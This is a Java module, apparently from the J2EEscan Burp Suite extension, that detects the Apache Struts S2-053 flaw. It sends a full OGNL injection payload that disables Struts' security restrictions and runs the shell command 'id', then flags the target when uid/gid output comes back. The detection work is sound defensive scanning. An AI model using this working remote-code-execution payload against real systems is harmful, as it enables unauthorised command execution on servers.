package burp.j2ee.issues.impl;

import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.IRequestInfo;
import burp.IScanIssue;
import burp.IScannerInsertionPoint;
import burp.j2ee.Confidence;
import burp.j2ee.CustomScanIssue;
import burp.j2ee.Risk;
import burp.j2ee.issues.IModule;

import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.io.PrintWriter;

public class StrutsS2053 implements IModule {

    private static final String TITLE = "Struts S2-053 RCE";
    private static final String DESCRIPTION = "J2EEscan identified  S2-053 RCE in the webpage"
            + "<b>References</b>:<br /><br />"
            + "http://struts.apache.org/docs/s2-053.html<br />"
            + "https://github.com/vulhub/vulhub/tree/master/struts2/s2-053<br />"
            + "https://waf.ninja/struts2-vulnerability-evolution/";
    private PrintWriter stderr;
    private static final String REMEDY = "Upgrade to latest Apache Struts version";

    private static final List<Pattern> UID_REGEX = Arrays.asList(
            Pattern.compile("uid=[0-9]+.*gid=[0-9]+.*", Pattern.CASE_INSENSITIVE | Pattern.DOTALL | Pattern.MULTILINE));
    // TODO FIXME Disable these patterns to avoid FP

    //Pattern.compile("file not found", Pattern.CASE_INSENSITIVE | Pattern.DOTALL | Pattern.MULTILINE),
    //Pattern.compile("java\\.io\\.FileNotFoundException", Pattern.CASE_INSENSITIVE | Pattern.DOTALL | Pattern.MULTILINE));

    private static final List<byte[]> PAYLOAD_INJ = Arrays.asList(
            "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}".getBytes());

    public List<IScanIssue> scan(IBurpExtenderCallbacks callbacks, IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {

        IExtensionHelpers helpers = callbacks.getHelpers();
        List<IScanIssue> issues = new ArrayList<>();
        IRequestInfo reqInfo = callbacks.getHelpers().analyzeRequest(baseRequestResponse);
        URL curURL = reqInfo.getUrl();

        for (byte[] INJ_TEST : PAYLOAD_INJ) {
            // make a request containing our injection test in the insertion point
            byte[] checkRequest = insertionPoint.buildRequest(INJ_TEST);

            IHttpRequestResponse checkRequestResponse = callbacks.makeHttpRequest(
                    baseRequestResponse.getHttpService(), checkRequest);

            String response = helpers.bytesToString(checkRequestResponse.getResponse());

            for (Pattern xincludeMatcher : UID_REGEX) {

                Matcher matcher = xincludeMatcher.matcher(response);

                if (matcher.find()) {
                    issues.add(new CustomScanIssue(
                            baseRequestResponse.getHttpService(),
                            helpers.analyzeRequest(baseRequestResponse).getUrl(),
                            checkRequestResponse,
                            TITLE,
                            DESCRIPTION,
                            REMEDY,
                            Risk.High,
                            Confidence.Firm
                    ));
                    return issues;
                }
            }
        }

        return issues;
    }
}
